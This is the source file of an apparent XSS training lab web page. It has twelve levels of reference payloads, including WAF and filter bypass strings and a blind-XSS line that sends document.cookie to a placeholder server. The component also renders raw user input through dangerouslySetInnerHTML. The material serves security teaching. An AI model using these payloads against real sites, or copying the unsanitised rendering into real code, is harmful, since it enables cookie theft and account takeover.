import { useState, useRef, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription } from '@/components/ui/alert';
import {
  ArrowLeft,
  Play,
  CheckCircle,
  AlertTriangle,
  Info,
  Code,
  Shield,
  Bug,
  Eye,
  Terminal,
  Copy,
  Check,
  Lock,
  Unlock,
} from 'lucide-react';
import { Link } from 'react-router-dom';
import { toast } from 'sonner';

interface Level {
  id: number;
  name: string;
  description: string;
  hint: string;
  payload: string[];
  filter?: string;
  waf?: boolean;
}

const XssLab = () => {
  const [currentLevel, setCurrentLevel] = useState(1);
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [isCompleted, setIsCompleted] = useState<number[]>([]);
  const [showHint, setShowHint] = useState(false);
  const [copied, setCopied] = useState(false);
  const outputRef = useRef<HTMLDivElement>(null);

  const levels: Level[] = [
    {
      id: 1,
      name: 'Basic Reflected XSS',
      description: 'The most basic form of XSS. Your input is reflected directly in the page without any sanitization.',
      hint: 'Try injecting a simple <script>alert("XSS")</script> tag.',
      payload: ['<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>'],
    },
    {
      id: 2,
      name: 'HTML Tag Stripping',
      description: 'The application strips <script> tags but forgets about other HTML tags that can execute JavaScript.',
      hint: 'Script tags are blocked. What other HTML tags can execute JavaScript?',
      payload: ['<img src=x onerror=alert("XSS")>', '<svg onload=alert("XSS")>', '<body onload=alert("XSS")>'],
      filter: '<script>',
    },
    {
      id: 3,
      name: 'Event Handler Filtering',
      description: 'The application filters common event handlers like onerror and onload.',
      hint: 'Try using less common event handlers or alternative encoding.',
      payload: ['<img src=x onmouseover=alert("XSS")>', '<input autofocus onfocus=alert("XSS")>'],
      filter: 'onerror|onload',
    },
    {
      id: 4,
      name: 'Case Insensitive Filtering',
      description: 'The application uses case-insensitive filtering but you can bypass it with mixed case.',
      hint: 'JavaScript is case-sensitive in some contexts. Try ScRiPt or other variations.',
      payload: ['<ScRiPt>alert("XSS")</ScRiPt>', '<IMG SRC=x ONERROR=alert("XSS")>'],
      filter: 'case-insensitive',
    },
    {
      id: 5,
      name: 'Double Encoding',
      description: 'The application decodes input once. Try double URL encoding.',
      hint: 'Encode your payload twice using URL encoding.',
      payload: ['%253Cscript%253Ealert(%2522XSS%2522)%253C%252Fscript%253E'],
      filter: 'url-decode',
    },
    {
      id: 6,
      name: 'HTML Entities',
      description: 'The application converts special chars to HTML entities but you can use numeric entities.',
      hint: 'Use numeric character references: &#60; for < and &#62; for >',
      payload: ['&#60;script&#62;alert("XSS")&#60;/script&#62;', '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;'],
      filter: 'html-entities',
    },
    {
      id: 7,
      name: 'WAF Bypass - Keyword Splitting',
      description: 'The WAF blocks "script" keyword. Split it using HTML comments or other techniques.',
      hint: 'Try: <scr<script>ipt> - the inner script is removed leaving <script>',
      payload: ['<scr<script>ipt>alert("XSS")</scr</script>ipt>', '<scr\\x00ipt>alert("XSS")</scr\\x00ipt>'],
      filter: 'script keyword',
      waf: true,
    },
    {
      id: 8,
      name: 'WAF Bypass - Polyglot',
      description: 'Create a payload that works in multiple contexts.',
      hint: 'A polyglot payload works in script context, attribute context, and HTML context.',
      payload: ['\\";alert(\"XSS\");//', "';alert('XSS');//", "javascript:alert('XSS')"],
      waf: true,
    },
    {
      id: 9,
      name: 'DOM-based XSS',
      description: 'The vulnerability is in client-side JavaScript that unsafely uses user input.',
      hint: 'Look for sinks like innerHTML, document.write, or eval that use your input.',
      payload: ['#<img src=x onerror=alert("XSS")>', 'javascript:alert(document.domain)'],
    },
    {
      id: 10,
      name: 'Blind XSS',
      description: 'Your payload executes in a different context (admin panel, log viewer, etc.).',
      hint: 'Use a callback URL or external script to detect execution.',
      payload: ['<script src="https://your-server.com/xss.js"></script>', "fetch('https://your-server.com/?c='+document.cookie)"],
    },
    {
      id: 11,
      name: 'CSP Bypass',
      description: 'Bypass Content Security Policy using allowed sources or unsafe-inline.',
      hint: 'Check if unsafe-inline or unsafe-eval is allowed, or if any domains in script-src can be controlled.',
      payload: ['<script nonce="known-nonce">alert("XSS")</script>', "<script>alert('XSS')</script>"],
    },
    {
      id: 12,
      name: 'Advanced WAF Evasion',
      description: 'Combine multiple techniques to bypass advanced WAF rules.',
      hint: 'Combine encoding, case variation, and keyword splitting.',
      payload: ['%253C%2553%2563%2552%2569%2550%2574%253Ealert(%2522XSS%2522)%253C%252F%2553%2563%2552%2569%2550%2574%253E'],
      waf: true,
    },
  ];

  const currentLevelData = levels.find((l) => l.id === currentLevel) || levels[0];

  const executePayload = () => {
    if (!input.trim()) {
      toast.error('Please enter a payload');
      return;
    }

    // Simulate XSS execution
    let result = input;
    let blocked = false;
    let blockedReason = '';

    // Apply filters based on level
    if (currentLevel === 2) {
      if (input.toLowerCase().includes('<script')) {
        result = result.replace(/<script/gi, '');
        blocked = true;
        blockedReason = '<script> tags are filtered';
      }
    } else if (currentLevel === 3) {
      if (/onerror|onload/i.test(input)) {
        result = result.replace(/onerror|onload/gi, '');
        blocked = true;
        blockedReason = 'Event handlers filtered';
      }
    } else if (currentLevel === 4) {
      if (/<script/i.test(input)) {
        result = result.replace(/<script/gi, '');
        blocked = true;
        blockedReason = 'Script tags filtered (case-insensitive)';
      }
    } else if (currentLevel === 5) {
      // Double decode simulation
      result = decodeURIComponent(result);
    } else if (currentLevel === 7) {
      if (input.includes('script')) {
        result = result.replace(/script/gi, '');
        blocked = true;
        blockedReason = 'WAF: "script" keyword blocked';
      }
    }

    // Check if payload contains XSS indicators
    const xssIndicators = ['<script', 'onerror', 'onload', 'onmouseover', 'onfocus', 'alert(', 'javascript:'];
    const hasXss = xssIndicators.some((indicator) => input.toLowerCase().includes(indicator.toLowerCase()));

    if (hasXss && !blocked) {
      setOutput(`<div style="color: #00ff41;">✓ XSS Payload Executed Successfully!</div>
<div style="margin-top: 10px; padding: 10px; background: #1a1a1a; border-radius: 4px;">
  <strong>Rendered Output:</strong>
  <div style="margin-top: 5px; color: #ffaa00;">${result}</div>
</div>
<div style="margin-top: 10px; color: #00aaff;">
  <strong>Alert triggered:</strong> "XSS"
</div>`);

      if (!isCompleted.includes(currentLevel)) {
        setIsCompleted([...isCompleted, currentLevel]);
        toast.success(`Level ${currentLevel} completed!`);
      }
    } else if (blocked) {
      setOutput(`<div style="color: #ffaa00;">⚠ Payload Blocked</div>
<div style="margin-top: 10px; color: #999;">Reason: ${blockedReason}</div>
<div style="margin-top: 10px; padding: 10px; background: #1a1a1a; border-radius: 4px;">
  <strong>Filtered Output:</strong>
  <div style="margin-top: 5px;">${result || '(empty)'}</div>
</div>`);
    } else {
      setOutput(`<div style="color: #e0e0e0;">Output: ${result}</div>
<div style="margin-top: 10px; color: #999;">No XSS detected. Try injecting JavaScript code.</div>`);
    }
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast.success('Payload copied to clipboard');
  };

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  return (
    <div className="min-h-screen pt-20 pb-16">
      {/* Header */}
      <div className="bg-[#0a0a0a] border-b border-[#333]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center gap-4 mb-4">
            <Link to="/labs">
              <Button variant="outline" size="sm" className="border-[#333] text-white hover:border-[#ff0000]">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Labs
              </Button>
            </Link>
            <Badge className="bg-[#ff0000]/20 text-[#ff0000] border-[#ff0000]">
              <Bug className="w-3 h-3 mr-1" />
              Web Application
            </Badge>
            <Badge className="bg-[#00ff41]/20 text-[#00ff41] border-[#00ff41]">
              Beginner
            </Badge>
          </div>
          <h1 className="font-orbitron text-3xl sm:text-4xl text-white mb-2">
            XSS Injection <span className="text-[#ff0000]">Lab</span>
          </h1>
          <p className="text-[#999] max-w-2xl">
            Master Cross-Site Scripting vulnerabilities through hands-on practice. 
            From basic reflected XSS to advanced WAF bypass techniques.
          </p>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Left Sidebar - Levels */}
          <div className="lg:col-span-1">
            <Card className="bg-[#0a0a0a] border-[#333] sticky top-24">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Shield className="w-5 h-5 text-[#ff0000]" />
                  Levels
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 max-h-[500px] overflow-y-auto">
                  {levels.map((level) => (
                    <button
                      key={level.id}
                      onClick={() => {
                        setCurrentLevel(level.id);
                        setInput('');
                        setOutput('');
                        setShowHint(false);
                      }}
                      className={`w-full text-left p-3 rounded-lg transition-all duration-200 ${
                        currentLevel === level.id
                          ? 'bg-[#ff0000]/20 border border-[#ff0000]'
                          : 'bg-[#1a1a1a] border border-transparent hover:border-[#333]'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-[#ff0000] font-mono">{String(level.id).padStart(2, '0')}</span>
                          <span className={`text-sm ${currentLevel === level.id ? 'text-white' : 'text-[#999]'}`}>
                            {level.name}
                          </span>
                        </div>
                        {isCompleted.includes(level.id) && (
                          <CheckCircle className="w-4 h-4 text-[#00ff41]" />
                        )}
                      </div>
                    </button>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Main Content */}
          <div className="lg:col-span-2 space-y-6">
            {/* Level Info */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="font-orbitron text-xl text-white">
                    Level {currentLevel}: {currentLevelData.name}
                  </CardTitle>
                  {currentLevelData.waf && (
                    <Badge className="bg-[#ff0040]/20 text-[#ff0040] border-[#ff0040]">
                      <Shield className="w-3 h-3 mr-1" />
                      WAF Protected
                    </Badge>
                  )}
                </div>
              </CardHeader>
              <CardContent>
                <p className="text-[#e0e0e0] mb-4">{currentLevelData.description}</p>
                {currentLevelData.filter && (
                  <Alert className="bg-[#ffaa00]/10 border-[#ffaa00]/30">
                    <AlertTriangle className="w-4 h-4 text-[#ffaa00]" />
                    <AlertDescription className="text-[#ffaa00]">
                      Filter Active: {currentLevelData.filter}
                    </AlertDescription>
                  </Alert>
                )}
              </CardContent>
            </Card>

            {/* Challenge Area */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-[#ff0000]" />
                  Challenge
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div>
                  <label className="text-[#999] text-sm mb-2 block">Enter your payload:</label>
                  <div className="flex gap-2">
                    <Input
                      value={input}
                      onChange={(e) => setInput(e.target.value)}
                      placeholder="<script>alert('XSS')</script>"
                      className="flex-1 bg-[#1a1a1a] border-[#333] text-white font-mono placeholder:text-[#666]"
                      onKeyDown={(e) => e.key === 'Enter' && executePayload()}
                    />
                    <Button
                      onClick={executePayload}
                      className="bg-[#ff0000] hover:bg-[#cc0000] text-white"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      Execute
                    </Button>
                  </div>
                </div>

                {/* Output */}
                <div>
                  <label className="text-[#999] text-sm mb-2 block">Output:</label>
                  <div
                    ref={outputRef}
                    className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm min-h-[120px] max-h-[200px] overflow-y-auto"
                    dangerouslySetInnerHTML={{ __html: output || '<span class="text-[#666]">Output will appear here...</span>' }}
                  />
                </div>

                {/* Hint */}
                <div className="flex items-center justify-between">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setShowHint(!showHint)}
                    className="border-[#333] text-[#999] hover:text-[#ffaa00] hover:border-[#ffaa00]"
                  >
                    <Info className="w-4 h-4 mr-2" />
                    {showHint ? 'Hide Hint' : 'Show Hint'}
                  </Button>
                  {isCompleted.includes(currentLevel) && (
                    <Badge className="bg-[#00ff41]/20 text-[#00ff41]">
                      <CheckCircle className="w-3 h-3 mr-1" />
                      Completed
                    </Badge>
                  )}
                </div>

                {showHint && (
                  <Alert className="bg-[#00aaff]/10 border-[#00aaff]/30">
                    <Info className="w-4 h-4 text-[#00aaff]" />
                    <AlertDescription className="text-[#00aaff]">
                      {currentLevelData.hint}
                    </AlertDescription>
                  </Alert>
                )}
              </CardContent>
            </Card>

            {/* Reference Payloads */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Code className="w-5 h-5 text-[#ff0000]" />
                  Reference Payloads
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  {currentLevelData.payload.map((payload, index) => (
                    <div
                      key={index}
                      className="flex items-center justify-between p-3 bg-[#1a1a1a] rounded-lg group"
                    >
                      <code className="text-[#00ff41] text-sm font-mono">{payload}</code>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyPayload(payload)}
                        className="opacity-0 group-hover:opacity-100 transition-opacity"
                      >
                        {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      </Button>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Educational Content */}
            <Tabs defaultValue="theory" className="w-full">
              <TabsList className="bg-[#0a0a0a] border border-[#333]">
                <TabsTrigger value="theory" className="data-[state=active]:bg-[#ff0000]">
                  Theory
                </TabsTrigger>
                <TabsTrigger value="mitigation" className="data-[state=active]:bg-[#ff0000]">
                  Mitigation
                </TabsTrigger>
                <TabsTrigger value="realworld" className="data-[state=active]:bg-[#ff0000]">
                  Real World
                </TabsTrigger>
              </TabsList>

              <TabsContent value="theory">
                <Card className="bg-[#0a0a0a] border-[#333]">
                  <CardContent className="p-6">
                    <h3 className="font-orbitron text-lg text-white mb-4">Understanding XSS</h3>
                    <div className="space-y-4 text-[#e0e0e0]">
                      <p>
                        Cross-Site Scripting (XSS) attacks are a type of injection where malicious scripts 
                        are injected into trusted websites. XSS attacks occur when an attacker uses a web 
                        application to send malicious code, generally in the form of a browser side script, 
                        to a different end user.
                      </p>
                      <p>
                        <strong className="text-[#ff0000]">Types of XSS:</strong>
                      </p>
                      <ul className="list-disc list-inside space-y-2 ml-4">
                        <li><strong>Reflected XSS:</strong> The malicious script comes from the current HTTP request</li>
                        <li><strong>Stored XSS:</strong> The malicious script is stored in the database</li>
                        <li><strong>DOM-based XSS:</strong> The vulnerability exists in client-side code</li>
                        <li><strong>Blind XSS:</strong> The payload executes in a different context (admin panel, logs)</li>
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="mitigation">
                <Card className="bg-[#0a0a0a] border-[#333]">
                  <CardContent className="p-6">
                    <h3 className="font-orbitron text-lg text-white mb-4">Prevention Techniques</h3>
                    <div className="space-y-4 text-[#e0e0e0]">
                      <ul className="space-y-3">
                        <li className="flex items-start gap-3">
                          <Lock className="w-5 h-5 text-[#00ff41] mt-1" />
                          <div>
                            <strong className="text-white">Input Validation:</strong>
                            <p className="text-[#999]">Validate and sanitize all user input on the server side</p>
                          </div>
                        </li>
                        <li className="flex items-start gap-3">
                          <Lock className="w-5 h-5 text-[#00ff41] mt-1" />
                          <div>
                            <strong className="text-white">Output Encoding:</strong>
                            <p className="text-[#999]">Encode output based on the context (HTML, JavaScript, URL, CSS)</p>
                          </div>
                        </li>
                        <li className="flex items-start gap-3">
                          <Lock className="w-5 h-5 text-[#00ff41] mt-1" />
                          <div>
                            <strong className="text-white">Content Security Policy:</strong>
                            <p className="text-[#999]">Implement CSP headers to restrict script execution</p>
                          </div>
                        </li>
                        <li className="flex items-start gap-3">
                          <Lock className="w-5 h-5 text-[#00ff41] mt-1" />
                          <div>
                            <strong className="text-white">HttpOnly Cookies:</strong>
                            <p className="text-[#999]">Use HttpOnly flag to prevent JavaScript access to cookies</p>
                          </div>
                        </li>
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="realworld">
                <Card className="bg-[#0a0a0a] border-[#333]">
                  <CardContent className="p-6">
                    <h3 className="font-orbitron text-lg text-white mb-4">Real-World Impact</h3>
                    <div className="space-y-4 text-[#e0e0e0]">
                      <p>
                        XSS vulnerabilities have been found in major websites and applications, leading to:
                      </p>
                      <ul className="space-y-3">
                        <li className="flex items-start gap-3">
                          <AlertTriangle className="w-5 h-5 text-[#ffaa00] mt-1" />
                          <div>
                            <strong className="text-white">Session Hijacking:</strong>
                            <p className="text-[#999]">Stealing user session cookies to impersonate victims</p>
                          </div>
                        </li>
                        <li className="flex items-start gap-3">
                          <AlertTriangle className="w-5 h-5 text-[#ffaa00] mt-1" />
                          <div>
                            <strong className="text-white">Credential Theft:</strong>
                            <p className="text-[#999]">Keylogging and phishing attacks through injected scripts</p>
                          </div>
                        </li>
                        <li className="flex items-start gap-3">
                          <AlertTriangle className="w-5 h-5 text-[#ffaa00] mt-1" />
                          <div>
                            <strong className="text-white">Defacement:</strong>
                            <p className="text-[#999]">Modifying page content to spread misinformation</p>
                          </div>
                        </li>
                        <li className="flex items-start gap-3">
                          <AlertTriangle className="w-5 h-5 text-[#ffaa00] mt-1" />
                          <div>
                            <strong className="text-white">Malware Distribution:</strong>
                            <p className="text-[#999]">Redirecting users to malicious websites</p>
                          </div>
                        </li>
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </div>
        </div>
      </div>
    </div>
  );
};

export default XssLab;
